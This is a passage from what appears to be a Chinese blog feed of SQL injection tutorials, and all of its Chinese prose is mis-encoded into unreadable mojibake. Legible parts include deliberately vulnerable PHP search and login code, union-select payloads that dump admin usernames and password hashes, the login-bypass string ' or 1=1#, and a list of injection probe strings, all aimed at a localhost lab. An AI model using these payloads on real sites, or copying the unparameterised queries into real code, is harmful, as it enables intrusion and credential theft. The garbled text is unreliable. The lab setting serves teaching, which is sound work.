ä½†æ˜¯æœ‰ä¸€ä¸ªåœ°æ–¹ä¸åŒï¼Œåœ¨æŸ¥è¯¢è¡¨æ—¶ï¼ŒåŽé¢çš„æ¡ä»¶éœ€è¦æ”¹åŠ¨ã€‚éœ€è¦å°†and â€˜1â€™=â€™2 æ”¹ä¸ºwhere â€˜1â€™=â€™1ä¸ºä»€ä¹ˆï¼ŸæŽ¥ä¸‹æ¥æˆ‘ä»¬åˆè¿›å…¥mysqlä¸­æŸ¥è¯¢12345mysql&gt; select username,password from admin and '1'='2';ERROR 1064 (42000): You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'and '1'='2'' at line 1é‚£è¯•è¯•and '1'='1'mysql&gt; select username,password from admin and '1'='1';ERROR 1064 (42000): You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'and '1'='1'' at line 1 ç»“æžœéƒ½æŠ¥é”™äº†é‚£çŽ°åœ¨è¯¥æ€Žä¹ˆåŠžå‘¢ï¼Ÿæ‰€ä»¥æˆ‘æƒ³é—®ï¼Œä½ æœ‰è§è¿‡æŸ¥è¯¢è¯­å¥å®Œäº†ä¹‹åŽåœ¨åŽé¢åŠ ä¸Šandçš„å—ï¼Ÿæ‰€ä»¥è¿™ä¸ªåœ°æ–¹å¾—åŠ ä¸Šæ¡ä»¶whereå¦‚ä½•åŠ ï¼Ÿ1=1 , â€˜1â€™=â€™1â€™æ‰€ä»¥å¯å·²ç”¨where â€˜1â€™=â€™1â€™12345678mysql&gt; select username,password from admin where '1'='1';+----------+----------------------------------+| username | password |+----------+----------------------------------+| smelond | efe6398127928f1b2e9ef3207fb82663 || admin | efe6398127928f1b2e9ef3207fb82663 |+----------+----------------------------------+2 rows in set (0.00 sec) //çŽ°åœ¨æˆåŠŸäº†å§ æž„é€ sqlè¯­å¥ï¼š1http://127.0.0.1/webpentest/str/index.php?x=1' and 1=2 union select username,password,3 from admin where '1'='1 å¯†ç å°±è¿™æ ·çˆ†å‡ºæ¥äº† æœç´¢åž‹çœ‹äº†ä¸Šé¢çš„å­—ç¬¦ä¸²åž‹ï¼Œå¥½åƒä¹Ÿä¸éš¾ï¼Œå°±æ˜¯å•å¼•å·é—®é¢˜æŽ¥ä¸‹æ¥ï¼Œæˆ‘ä»¬æ¥çœ‹çœ‹æœç´¢åž‹æœç´¢åž‹ä¸€èˆ¬å‡ºçŽ°åœ¨æœç´¢æ¡†å½“ä¸­ï¼Œæˆ‘è¿™é‡Œå†™äº†ä¸€ä¸ªç®€å•çš„æœç´¢é¡µé¢æ ‡é¢˜ï¼Œè¿”å›žé¡µé¢å†…å®¹çš„phpä»£ç æ•°æ®åº“æˆ‘ä»¬è¿˜æ˜¯ç”¨ä¸Šé¢çš„sqlinstræ•°æ®åº“ä»£ç è´´ä¸Šï¼š12345678910111213141516171819202122232425262728293031323334353637&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt; &lt;meta charset="utf-8"&gt; &lt;title&gt;sqlæ³¨å…¥-æ³¨å…¥ç±»åž‹-æœç´¢åž‹&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;!--author: smelondfilename: index.phpblog: http://smelond.comsqlæ³¨å…¥-æ³¨å…¥ç±»åž‹-æœç´¢åž‹--&gt;&lt;form action=""&gt;&lt;input type="text" name="x" id=""&gt; //æ–‡æœ¬æ¡†&lt;input type="submit" name="" id="" value="æœç´ "&gt; //æäº¤æŒ‰é’®&lt;/form&gt;&lt;body/&gt;&lt;/html&gt;&lt;?php $title = $_GET['x']; //æŽ¥æ”¶xå˜é‡ï¼Œä¸Šé¢æ–‡æœ¬æ¡†çš„å€¼ $link=mysqli_connect("127.0.0.1","root","root","sqlinstr");//è¿žæŽ¥sqlinstræ•°æ®åº“ if ($link) &#123;//åˆ¤æ–­æ•°æ®åº“æ˜¯å¦å­˜åœ¨ mysqli_query($link,"set names utf8");//è®¾ç½®ç¼–ç æ ¼å¼ $sql="select * from page where title like '%$title%'";//æŸ¥è¯¢ï¼Œä½¿ç”¨äº†likeå…³é”®å­—ï¼ŒæŸ¥æ‰¾è¾“å…¥çš„å†…å®¹ if ($sql == "select * from page where title like '%%'") &#123; continue; &#125; $re=mysqli_query($link,$sql);//æ‰§è¡ŒæŸ¥è¯¢è¯­å¥ $data=mysqli_fetch_assoc($re);//èŽ·å–æ•°æ®åº“è¿”å›žçš„å†…å®¹ echo "æ–‡ç« idï¼š".$data['id']."&lt;hr /&gt;"; echo "æ–‡ç« æ ‡é¢˜ï¼š".$data['title']."&lt;hr /&gt;"; echo "æ–‡ç« å†…å®¹ï¼š".$data['content']."&lt;hr /&gt;"; echo "å½“å‰æ‰§è¡Œsqlè¯­å¥ï¼š".$sql; &#125;else&#123; echo "å¥½åƒå‡ºé”™äº†ï¼ŒåŽŸå› æœ‰å¾ˆå¤š...æ‰€ä»¥ä½ å…ˆåŽ»çœ‹çœ‹ä½ çš„æ•°æ®åº“é…ç½®å¥½æ²¡ã€‚ã€‚ã€‚"; &#125;?&gt; ä¸Šé¢å¯ä»¥çœ‹åˆ°æˆ‘ä»¬phpä»£ç é‡Œé¢çš„ä¸¤ä¸ªâ€œ%â€ç™¾åˆ†å·æŸ¥è¯¢è¯­å¥å°†ä¼šä¸ºï¼šselect * from page where title like â€˜%%â€™å¦‚æžœæˆ‘ä»¬åœ¨é‡Œé¢åŠ å…¥å†…å®¹ï¼ŒæŸ¥è¯¢è¯­å¥å°†ä¼šä¸ºï¼š1select * from page where title like '%test%' //æŸ¥è¯¢title='test'çš„å†…å®¹ å¦‚ä½•çªç ´çªç ´å…¶å®žä¹Ÿå¾ˆç®€å•ï¼Œä¸Šé¢çš„å­—ç¬¦ä¸²ç±»åž‹ä¸ºâ€™â€™è¿™é‡Œçš„æœç´¢åž‹ä¸ºâ€™%%â€™é‚£æˆ‘ä»¬ç›´æŽ¥åˆ©ç”¨å­—ç¬¦ä¸²çš„æ€è·¯ï¼Œå°†æœç´¢%â€™é—­åˆ1test%' and '100%'='100 é‚£ä¹ˆæˆ‘ä»¬æž„é€ æ‰§è¡Œçš„è¯­å¥å°†ä¼šæ˜¯è¿™æ ·çš„ï¼š1http://127.0.0.1/webpentest/search/index.php?x=test%' and '100%'='100 è¯­å¥ç»“æžœï¼š1å½“å‰æ‰§è¡Œsqlè¯­å¥ï¼šselect * from page where title like '%test%' and '100%'='100%' //æ­£å¸¸è¿”å›žï¼Œå¹¶ä¸”æ‰€æœåˆ°äº†testçš„å†…å®¹ï¼Œè¿”å›žäº†é¡µé¢å†…å®¹ æž„é€ å…¶ä»–çš„è¯­å¥ï¼š123456http://127.0.0.1/webpentest/search/index.php?x=test%' and 1=1 order by 4 and '100%'='100 //è¿”å›žæ­£ç¡®ï¼Œæ˜¾ç„¶order byè¿˜æ˜¯ä¸èƒ½ç”¨ã€‚ã€‚ã€‚http://127.0.0.1/webpentest/search/index.php?x=test%' and 1=2 union select 1 and '100%'='100 //é”™è¯¯http://127.0.0.1/webpentest/search/index.php?x=test%' and 1=2 union select 1,2 and '100%'='100 //é”™è¯¯http://127.0.0.1/webpentest/search/index.php?x=test%' and 1=2 union select 1,2,3 and '100%'='100 //æ­£ç¡®ï¼Œåˆ¤æ–­å‡ºæ¥äº†3ä¸ªå­—æ®µhttp://127.0.0.1/webpentest/search/index.php?x=test%' and 1=2 union select 1,2,3,4 and '100%'='100 //é”™è¯¯http://127.0.0.1/webpentest/search/index.php?x=test%' and 1=2 union select username,password,3 from admin where '100%'='100 æž„é€ å…¶ä»–çš„è¯­å¥å°±ç®€å•äº†ä½†æ˜¯è®°å¾—åœ¨çˆ†åº“è¡¨çˆ†å­—æ®µï¼ŒæŸ¥è¯¢è´¦å·å¯†ç æ—¶è®°å¾—é¢å°†and â€˜100%â€™=â€™100æ”¹ä¸ºwhere â€˜100%â€™=â€™100 æäº¤æ³¨å…¥ä¸¤ç§å¸¸è§çš„æäº¤æ³¨å…¥ï¼šåˆ†åˆ«æ˜¯GETå’ŒPOSTGETæˆ‘ä»¬å·²ç»åœ¨ä¸Šé¢è¯´äº†ï¼Œæ¯”å¦‚æœç´¢æ¡†ï¼Œè¿˜æœ‰å°±æ˜¯åœ¨ç½‘å€ä¸Šï¼Œæ€»ä¹‹å‰é¢è¯´åˆ°çš„æ‰€æœ‰æ³¨å…¥å…¨éƒ¨éƒ½æ˜¯GETåž‹æˆ‘ä»¬å¯ä»¥ä»Žå‰é¢çš„phpä»£ç ä¸­å‘çŽ°è¿™æ®µä»£ç 1$id = $_GET['x']; é‚£ä¹ˆï¼ŒPOSTæäº¤å½“ç„¶å°±æ˜¯è¿™æ ·å†™çš„:1$id = $_POST['x']; å¾ˆç®€å•ï¼Œç›´æŽ¥å°†GETå†™ä¸ºPOSTå³å¯ è¿™ä¸¤ç§è¯·æ±‚æœ‰ä»€ä¹ˆåŒºåˆ«ï¼Ÿ å¬è¯´è¿™æ˜¯æ ‡å‡†ç­”æ¡ˆï¼š GETåœ¨æµè§ˆå™¨å›žé€€æ—¶æ˜¯æ— å®³çš„ï¼Œè€ŒPOSTä¼šå†æ¬¡æäº¤è¯·æ±‚ã€‚ GETäº§ç”Ÿçš„URLåœ°å€å¯ä»¥è¢«Bookmarkï¼Œè€ŒPOSTä¸å¯ä»¥ã€‚ GETè¯·æ±‚ä¼šè¢«æµè§ˆå™¨ä¸»åŠ¨cacheï¼Œè€ŒPOSTä¸ä¼šï¼Œé™¤éžæ‰‹åŠ¨è®¾ç½®ã€‚ GETè¯·æ±‚åªèƒ½è¿›è¡Œurlç¼–ç ï¼Œè€ŒPOSTæ”¯æŒå¤šç§ç¼–ç æ–¹å¼ã€‚ GETè¯·æ±‚å‚æ•°ä¼šè¢«å®Œæ•´ä¿ç•™åœ¨æµè§ˆå™¨åŽ†å²è®°å½•é‡Œï¼Œè€ŒPOSTä¸­çš„å‚æ•°ä¸ä¼šè¢«ä¿ç•™ã€‚ GETè¯·æ±‚åœ¨URLä¸­ä¼ é€çš„å‚æ•°æ˜¯æœ‰é•¿åº¦é™åˆ¶çš„ï¼Œè€ŒPOSTä¹ˆæœ‰ã€‚ å¯¹å‚æ•°çš„æ•°æ®ç±»åž‹ï¼ŒGETåªæŽ¥å—ASCIIå­—ç¬¦ï¼Œè€ŒPOSTæ²¡æœ‰é™åˆ¶ã€‚ GETæ¯”POSTæ›´ä¸å®‰å…¨ï¼Œå› ä¸ºå‚æ•°ç›´æŽ¥æš´éœ²åœ¨URLä¸Šï¼Œæ‰€ä»¥ä¸èƒ½ç”¨æ¥ä¼ é€’æ•æ„Ÿä¿¡æ¯ã€‚ GETå‚æ•°é€šè¿‡URLä¼ é€’ï¼ŒPOSTæ”¾åœ¨Request bodyä¸­ã€‚ æœ‰ä¸€ç¯‡æ–‡ç« 99%çš„äººç†è§£é”™ HTTP ä¸­ GET ä¸Ž POST çš„åŒºåˆ«ï¼Œå¦å®šäº†ä¸Šè¿°å›žç­”ï¼šâ€œå¾ˆé—æ†¾ï¼Œè¿™ä¸æ˜¯æˆ‘ä»¬è¦çš„å›žç­”ï¼â€ï¼Œä½œè€…è¯´ï¼šGETå’ŒPOSTæœ¬è´¨ä¸Šå°±æ˜¯TCPé“¾æŽ¥ï¼Œå¹¶æ— å·®åˆ«ã€‚ä½†æ˜¯ç”±äºŽHTTPçš„è§„å®šå’Œæµè§ˆå™¨/æœåŠ¡å™¨çš„é™åˆ¶ï¼Œå¯¼è‡´ä»–ä»¬åœ¨åº”ç”¨è¿‡ç¨‹ä¸­ä½“çŽ°å‡ºä¸€äº›ä¸åŒã€‚ GETå’ŒPOSTè¿˜æœ‰ä¸€ä¸ªé‡å¤§åŒºåˆ«ï¼Œç®€å•çš„è¯´ï¼šGETäº§ç”Ÿä¸€ä¸ªTCPæ•°æ®åŒ…ï¼›POSTäº§ç”Ÿä¸¤ä¸ªTCPæ•°æ®åŒ…ã€‚å¯¹äºŽGETæ–¹å¼çš„è¯·æ±‚ï¼Œæµè§ˆå™¨ä¼šæŠŠhttp headerå’Œdataä¸€å¹¶å‘é€å‡ºåŽ»ï¼ŒæœåŠ¡å™¨å“åº”200ï¼ˆè¿”å›žæ•°æ®ï¼‰ï¼› è€Œå¯¹äºŽPOSTï¼Œæµè§ˆå™¨å…ˆå‘é€headerï¼ŒæœåŠ¡å™¨å“åº”100 continueï¼Œæµè§ˆå™¨å†å‘é€dataï¼ŒæœåŠ¡å™¨å“åº”200 okï¼ˆè¿”å›žæ•°æ®ï¼‰ã€‚ æ„Ÿè§‰è¿™ç¯‡æ–‡ç« è¿˜æ˜¯æ¯”è¾ƒé«˜å¤§ä¸Šçš„è¿™é‡Œå…ˆä¸æ‰¯è¿™ä¹ˆå¤šäº†ï¼Œäº†è§£äº†postå’Œgetçš„åŒºåˆ«ä¹‹åŽæˆ‘ä»¬æ¥çœ‹çœ‹postæäº¤æ³¨å…¥ postæäº¤æ³¨å…¥è¿˜æ˜¯ç”¨å‰é¢ç”¨è¿‡çš„æ•°æ®åº“sqlinstrï¼Œä½†æ˜¯è¡¨ç”¨adminè¡¨ï¼Œå› ä¸ºè¿™æ˜¯ç™»å½•ï¼Œéœ€è¦éªŒè¯æ˜¯å¦ç™»å½•æˆåŠŸï¼Œå…·ä½“çœ‹ä»£ç  è´´ä¸Šæˆ‘çš„html+phpä»£ç ï¼šæ–‡ä»¶åï¼šindex.htmlç™»å½•é¡µé¢12345678910111213141516171819202122232425&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt; &lt;meta charset="utf-8"&gt; &lt;title&gt;sqlæ³¨å…¥-POSTæäº¤æ³¨å…¥-ç™»å½•æ¡†&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;!--author: smelondfilename: index.phpblog: http://smelond.comsqlæ³¨å…¥-POSTæäº¤æ³¨å…¥-ç™»å½•æ¡†--&gt; &lt;div style="margin: 0px auto;width: 400px;text-align: center;"&gt; &lt;form action="index.php" method="POST"&gt; &lt;fieldset&gt; &lt;legend&gt;ç™»å½•&lt;/legend&gt; &lt;input type="text" name="username" placeholder="è¯·è¾“å…¥ç”¨æˆ·å"&gt;&lt;br&gt; &lt;input type="password" name="password" placeholder="è¯·è¾“å…¥å¯†ç "&gt;&lt;br&gt; &lt;input type="submit" name="sub" value="ç™»å½•"&gt;&lt;br&gt; &lt;/fieldset&gt; &lt;/form&gt; &lt;/div&gt;&lt;/body&gt;&lt;/html&gt; æ–‡ä»¶åï¼šindex.phpåŽå°é¡µé¢1234567891011121314151617181920212223242526272829303132333435363738394041&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt; &lt;meta charset="utf-8"&gt; &lt;title&gt;sqlæ³¨å…¥-POSTæäº¤æ³¨å…¥-åŽå°é¡µé¢&lt;/title&gt;&lt;/head&gt;&lt;body&gt; &lt;!-- author: smelond filename: index.php blog: http://smelond.com sqlæ³¨å…¥-POSTæäº¤æ³¨å…¥-åŽå°é¡µé¢ --&gt;&lt;/body&gt;&lt;/html&gt;&lt;?php $username = $_POST['username']; $password = $_POST['password']; if ($username == '') &#123; exit("ç”¨æˆ·åä¸èƒ½ä¸ºç©º"); &#125; if ($password == '') &#123; exit("å¯†ç ä¸èƒ½ä¸ºç©º"); &#125; $password = md5($password); // echo "$password"; $link = mysqli_connect("127.0.0.1","root","root","sqlinstr");//è¿žæŽ¥sqlinstræ•°æ®åº“ if ($link) &#123;//åˆ¤æ–­æ•°æ®åº“æ˜¯å¦å­˜åœ¨ mysqli_query($link,"set names utf8");//è®¾ç½®ç¼–ç æ ¼å¼ $sql = "select * from admin where username='$username' and password='$password'";//æŸ¥è¯¢ $re = mysqli_query($link,$sql);//æ‰§è¡ŒæŸ¥è¯¢è¯­å¥ $data = mysqli_fetch_assoc($re);//èŽ·å–æ•°æ®åº“è¿”å›žçš„å†…å®¹ if ($data) &#123;//åˆ¤æ–­æ˜¯å¦æœ‰è¿”å›žå€¼ // var_dump($data); echo "åŽå°é¡µé¢ï¼š&lt;br /&gt;"; echo "æ¬¢è¿Žä½ ï¼š".$username; &#125;else&#123;//å¦è€…é”™è¯¯ echo "ç”¨æˆ·åæˆ–å¯†ç ä¸æ­£ç¡®"; &#125; echo "&lt;br /&gt;"."å½“å‰æ‰§è¡Œsqlè¯­å¥ï¼š".$sql; &#125;else&#123; echo "å¥½åƒå‡ºé”™äº†ï¼ŒåŽŸå› æœ‰å¾ˆå¤š...æ‰€ä»¥ä½ å…ˆåŽ»çœ‹çœ‹ä½ çš„æ•°æ®åº“é…ç½®å¥½æ²¡ã€‚ã€‚ã€‚"; &#125;?&gt; çŽ°åœ¨æ‰“å¼€æˆ‘ä»¬çš„urlï¼š1http://127.0.0.1/webpentest/postrequest/index.html çœ‹åˆ°ç™»å½•é¡µé¢å·²ç»å†™å¥½äº†ï¼Œè¯•ç€ç™»å½•ä¸€ä¸‹ç™»å½•æˆåŠŸ é‚£ä¹ˆæ€Žä¹ˆç»•è¿‡ï¼Œç›´æŽ¥ç™»å½•å‘¢ï¼Ÿä»Žç™»é™†é¡µé¢çš„sqlè¯­å¥ä¸­å¯ä»¥çœ‹åˆ°è¯­å¥ä¸ºï¼š1select * from admin where username='smelond' and password='efe6398127928f1b2e9ef3207fb82663' æƒ³äº†æƒ³ï¼Œè¿™ä¸ªè¯­å¥åº”è¯¥å¯ä»¥ç›´æŽ¥æ³¨é‡Šå§ï¼Ÿå¥½äº†ï¼Œè¿”å›žindex.htmlé¡µé¢æˆ‘ä»¬åŽ»æ³¨é‡Šä¸€ä¸‹12è´¦å·ï¼šsmelond#å¯†ç ï¼šasdfas å‘çŽ°ç™»å½•å¤±è´¥çœ‹çœ‹ï¼Œæˆ‘ä»¬åªæ˜¯å•çº¯çš„åœ¨ç”¨æˆ·ååŽé¢åŠ ä¸Šäº†#å·ï¼Œé‚£ä¹ˆçŽ°åœ¨è¯­å¥å˜æˆäº†ï¼š1select * from admin where username='smelond çœ‹çœ‹æˆ‘ä»¬æž„é€ çš„è¯­å¥ï¼Œæ˜Žæ˜¾ä¸å®Œæ•´ é‚£æˆ‘ä»¬æ¥æž„é€ ä¸€æ¡å®Œæ•´çš„è¯­å¥ï¼š12smelond'# //#å·å°†åŽé¢çš„æ³¨é‡Šäº†select * from admin where username='smelond' //æ‰€ä»¥è¯­å¥ç›´æŽ¥å˜æˆäº†è¿™ä¸ª ä¸€èˆ¬æˆ‘ä»¬ä¼šè¿™æ ·å†™ï¼š12smelond' or 1=1#select * from admin where username='smelond' or 1=1 é¡µé¢ä¸Šæ˜¾ç¤ºäº†æ¬¢è¿Žä½ ï¼Œæˆ‘ä»¬å·²ç»è¿›å…¥åŽå°äº† å¦‚æžœåŽå°æœ‰æŸ¥è¯¢æ•°æ®åº“ï¼Œé‚£æˆ‘ä»¬å¯ä»¥ç›´æŽ¥åœ¨ç™»å½•é¡µé¢å°†çˆ†åº“ï¼Œçˆ†è¡¨ï¼Œçˆ†å¯†ç ï¼š é‚£æˆ‘ä»¬å°†ä¸Šé¢çš„åŽå°ä»£ç ä¿®æ”¹ä¸€ä¸‹ï¼Œè®©ä»–æœ‰æ•°æ®åº“æŸ¥è¯¢ï¼Œå¹¶ä¸”å›žæ˜¾ï¼š123456789101112131415161718192021222324252627282930313233343536373839404142&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt; &lt;meta charset="utf-8"&gt; &lt;title&gt;sqlæ³¨å…¥-POSTæäº¤æ³¨å…¥-åŽå°é¡µé¢&lt;/title&gt;&lt;/head&gt;&lt;body&gt; &lt;!-- author: smelond filename: index.php blog: http://smelond.com sqlæ³¨å…¥-POSTæäº¤æ³¨å…¥-åŽå°é¡µé¢ --&gt;&lt;/body&gt;&lt;/html&gt;&lt;?php $username = $_POST['username']; $password = $_POST['password']; if ($username == '') &#123; exit("ç”¨æˆ·åä¸èƒ½ä¸ºç©º"); &#125; if ($password == '') &#123; exit("å¯†ç ä¸èƒ½ä¸ºç©º"); &#125; $password = md5($password); // echo "$password"; $link = mysqli_connect("127.0.0.1","root","root","sqlinstr");//è¿žæŽ¥sqlinstræ•°æ®åº“ if ($link) &#123;//åˆ¤æ–­æ•°æ®åº“æ˜¯å¦å­˜åœ¨ mysqli_query($link,"set names utf8");//è®¾ç½®ç¼–ç æ ¼å¼ $sql = "select * from admin where username='$username' and password='$password'";//æŸ¥è¯¢ $re = mysqli_query($link,$sql);//æ‰§è¡ŒæŸ¥è¯¢è¯­å¥ $data = mysqli_fetch_assoc($re);//èŽ·å–æ•°æ®åº“è¿”å›žçš„å†…å®¹ if ($data) &#123;//åˆ¤æ–­æ˜¯å¦æœ‰è¿”å›žå€¼ // var_dump($data); echo "åŽå°é¡µé¢ï¼š&lt;br /&gt;"; // echo "æ¬¢è¿Žä½ ï¼š".$username; echo "æ¬¢è¿Žä½ ï¼š".$data['username']."&lt;hr /&gt;"; //æˆ‘ä»¬åªä¿®æ”¹äº†è¿™å¥ &#125;else&#123;//å¦è€…é”™è¯¯ echo "ç”¨æˆ·åæˆ–å¯†ç ä¸æ­£ç¡®"; &#125; echo "&lt;br /&gt;"."å½“å‰æ‰§è¡Œsqlè¯­å¥ï¼š".$sql; &#125;else&#123; echo "å¥½åƒå‡ºé”™äº†ï¼ŒåŽŸå› æœ‰å¾ˆå¤š...æ‰€ä»¥ä½ å…ˆåŽ»çœ‹çœ‹ä½ çš„æ•°æ®åº“é…ç½®å¥½æ²¡ã€‚ã€‚ã€‚"; &#125;?&gt; ä¸Šé¢æˆ‘ä»¬åªä¿®æ”¹äº†ä¸€å¥ï¼Œä½†æ˜¯æ•ˆæžœå°±ä¸ä¸€æ ·äº†æ‰“å¼€index.htmlåœ¨è´¦å·æ¡†ä¸­è¾“å…¥ï¼š1' and 1=2 union select 1,2,3 or 1=1# è¿™ä¸ªæ—¶å€™ï¼Œå¯ä»¥çœ‹åˆ°æˆåŠŸç™»å½•ï¼Œå¹¶ä¸”ç”¨æˆ·åä¸ºï¼š2æ³¨æ„å›žæ˜¾çš„æ˜¯2ï¼Œæ‰€ä»¥æˆ‘ä»¬åœ¨ç™»å½•æ¡†è¾“å…¥æ—¶ï¼Œåªèƒ½æ”¹åŠ¨2ï¼Œå…¶ä»–åœ°æ–¹æ”¹åŠ¨æ— æ•ˆã€ æŽ¥ç€ä»Žæ–°è¾“å…¥ï¼š1' and 1=2 union select 1,database(),3 or 1=1# ç”¨æˆ·åï¼šsqlinstr è¿™ä¸ªæ—¶å€™æˆ‘ä»¬è¾“å…¥ç”¨concatæ˜¯æœ€å¥½ä¸è¿‡çš„äº†1' and 1=2 union select 1,concat(database(),'---',user(),'---',version()),3 or 1=1# ç”¨æˆ·åï¼šsqlinstr---root@localhost---5.5.53 çˆ†è´¦å·å¯†ç ï¼š1asd' and 1=1 union select 1,concat(username,'--',password),3 from admin where 1=1#asad æ³¨æ„ï¼Œåœ¨ç®€å•çš„æŸ¥è¯¢è¯­å¥åŽé¢ä¸èƒ½åŠ and å’Œ or ï¼Œæ‰€ä»¥æˆ‘ä»¬è¿™é‡ŒåŠ ä¸Šäº†where å¥½äº†ï¼Œå·®ä¸å¤šäº†ï¼Œè¿™ä¸ªSQLæ³¨å…¥ç±»åž‹å°±å…ˆè¯´è¿™ä¹ˆå¤š~~å½“ç„¶ï¼Œæ³¨å…¥é‡Œé¢è¿˜æœ‰å…¶ä»–çš„æ³¨å…¥ï¼Œæ¯”å¦‚ï¼šcookieæ³¨å…¥ï¼Œhttpå¤´æ³¨å…¥]]></content>
      <categories>
        <category>webå®‰å…¨</category>
      </categories>
      <tags>
        <tag>webå®‰å…¨</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[sqlæ³¨å…¥ä¹‹å…¥é—¨]]></title>
    <url>%2F2018%2F03%2F28%2Fsql%E6%B3%A8%E5%85%A5%E4%B9%8B%E5%85%A5%E9%97%A8%2F</url>
    <content type="text"><![CDATA[MySqlåŸºç¡€è¯­æ³•mysqlæ— éžå°±æ˜¯å¢žåˆ æ”¹æŸ¥ mysqlæ•°æ®åº“ç»“æž„ï¼š æ•°æ®åº“ test,test1 è¡¨å admin,manage æ•°æ® id,username,password çŽ°åœ¨ï¼Œä¸ºäº†æˆ‘ä»¬æŽ¥ä¸‹æ¥çš„å®žéªŒï¼Œæˆ‘ä»¬éœ€è¦åˆ‡æ¢æ•°æ®åº“åˆ°testï¼Œmysqlè‡ªå¸¦ä¸€ä¸ªtestæ•°æ®åº“ï¼Œæ²¡æœ‰è£…mysqlçš„è‡ªè¡Œç™¾åº¦åˆ‡æ¢æ–¹å¼ï¼š12mysql&gt; use test;Database changed //æœ‰è¿™æ¡æç¤ºå°±åˆ‡æ¢æˆåŠŸäº† create åˆ›å»ºè¡¨ é¦–å…ˆæˆ‘ä»¬å…ˆæ¥åˆ›å»ºä¸€ä¸ªè¡¨åä¸ºï¼šadminï¼Œé‡Œé¢åŒ…å«äº†idï¼Œusernameï¼Œpasswordï¼Œemailï¼š123456mysql&gt; create table admin( -&gt; id int(3) auto_increment not null primary key, -&gt; username varchar(15) not null, -&gt; password char(32), -&gt; email varchar(30));Query OK, 0 rows affected (0.01 sec) --æœ‰äº†è¿™ä¸ªæç¤ºå°±æ˜¯åˆ›å»ºæˆåŠŸäº† çŽ°åœ¨æˆ‘ä»¬å·²ç»æˆåŠŸåˆ›å»ºäº†ä¸€ä¸ª,å¯ä»¥ç”¨descæ¥æŸ¥çœ‹è¡¨ç»“æž„ï¼š12345678910mysql&gt; desc admin;+----------+-------------+------+-----+---------+----------------+| Field | Type | Null | Key | Default | Extra |+----------+-------------+------+-----+---------+----------------+| id | int(3) | NO | PRI | NULL | auto_increment || username | varchar(15) | NO | | NULL | || password | char(32) | YES | | NULL | || email | varchar(30) | YES | | NULL | |+----------+-------------+------+-----+---------+----------------+4 rows in set (0.04 sec) insert æ’å…¥æ•°æ® æŽ¥ç€ä¸Šé¢çš„è¡¨ï¼Œæˆ‘ä»¬æƒ³è¡¨é‡Œé¢æ’å…¥ä¸€æ¡æ•°æ®12mysql&gt; insert into admin(username,password,email) values('smelond','qweqwe','2698115328@qq.com'); --ä¸ºä»€ä¹ˆæ²¡æœ‰æŒ‡å®šidåˆ—ï¼Œå› ä¸ºæˆ‘ä»¬åœ¨åˆ›å»ºè¡¨æ—¶ç»™idæŒ‡å®šäº†è‡ªåŠ¨å¢žå€¼(auto_increment)Query OK, 1 row affected (0.00 sec) select æŸ¥è¯¢è¯­å¥ ä¸Šé¢æˆ‘ä»¬å·²ç»å‘æ•°æ®åº“é‡Œé¢æ’å…¥äº†ä¸€æ¡æ•°æ®äº†ï¼ŒçŽ°åœ¨æˆ‘ä»¬å¯ä»¥æŸ¥è¯¢ä¸€ä¸‹æ˜¯å¦æ’å…¥æˆåŠŸ1234567mysql&gt; select * from admin;+----+----------+----------+-------------------+| id | username | password | email |+----+----------+----------+-------------------+| 1 | smelond | qweqwe | 2698115328@qq.com |+----+----------+----------+-------------------+1 row in set (0.00 sec) --å·²ç»çœ‹åˆ°äº†ï¼Œæ•°æ®å·²ç»æ’å…¥è¿›åŽ»ï¼Œå¹¶ä¸”idå·ä¸º1ï¼Œå¦‚æžœæˆ‘ä»¬ä¸‹æ¬¡æ’å…¥idå·ä¼šè‡ªåŠ¨å¢žé•¿ update ä¿®æ”¹è¡¨ä¸­çš„æ•°æ® çŽ°åœ¨æˆ‘ä»¬ä¸ºadminæ•°æ®è¡¨åœ¨æ¬¡æ’å…¥ä¸€æ¡æ•°æ®12mysql&gt; insert into admin(username,password,email) values('admin','qweqwe','xxx@163.com');Query OK, 1 row affected (0.00 sec) æ’å…¥å®Œæˆä»¥åŽç”¨updataä¿®æ”¹adminçš„å¯†ç ä¸ºasdasd,(ä»ŽåŽŸæ¥çš„qweqweä¿®æ”¹ä¸ºasdasd)123mysql&gt; update admin set password='asdasd' where username='admin'; --ä¿®æ”¹passwrodä¸ºasdasdï¼Œæ¡ä»¶æ˜¯username=adminQuery OK, 1 row affected (0.00 sec)Rows matched: 1 Changed: 1 Warnings: 0 æŽ¥ç€æˆ‘ä»¬æŸ¥è¯¢ä¸€ä¸‹æ˜¯å¦ä¿®æ”¹æˆåŠŸ12345678mysql&gt; select * from admin;+----+----------+----------+-------------------+| id | username | password | email |+----+----------+----------+-------------------+| 1 | smelond | qweqwe | 2698115328@qq.com || 2 | admin | asdasd | xxx@163.com |+----+----------+----------+-------------------+2 rows in set (0.00 sec) delete åˆ é™¤è¡¨ä¸­çš„æ•°æ® ä¸Šé¢æˆ‘ä»¬å·²ç»å‘è¡¨ä¸­æ’å…¥äº†ä¸¤æ¡æ•°æ®äº†çŽ°åœ¨æˆ‘ä»¬è¯•ç€å°†è¡¨ä¸­çš„æ•°æ®åˆ é™¤12345mysql&gt; delete from admin where username='admin';Query OK, 1 row affected (0.00 sec)mysql&gt; delete from admin where id=1;Query OK, 1 row affected (0.00 sec) å¯ä»¥çœ‹åˆ°æˆ‘ä¸Šé¢å·²ç»åˆ é™¤äº†ä¸¤æ¡æ•°æ®ï¼ŒçŽ°åœ¨æŸ¥è¯¢adminæ•°æ®åº“é‡Œé¢åº”è¯¥ä»€ä¹ˆéƒ½æ²¡æœ‰12mysql&gt; select * from admin;Empty set (0.00 sec) å¸¸è§çš„æ–¹å¼æ‰‹å·¥åˆ¤æ–­ç½‘ç«™æ˜¯å¦å¯ä»¥æ³¨å…¥12345671=1 and 1=2admin' --admin' #admin'/*' or 1=1--' or 1=1/*' or 1=1# SQLæ³¨å…¥çš„å‡†å¤‡ä»€ä¹ˆæ˜¯SQLæ³¨å…¥æ”»å‡»ï¼Ÿ SQLæ”»å‡»ï¼ˆè‹±è¯­ï¼šSQL 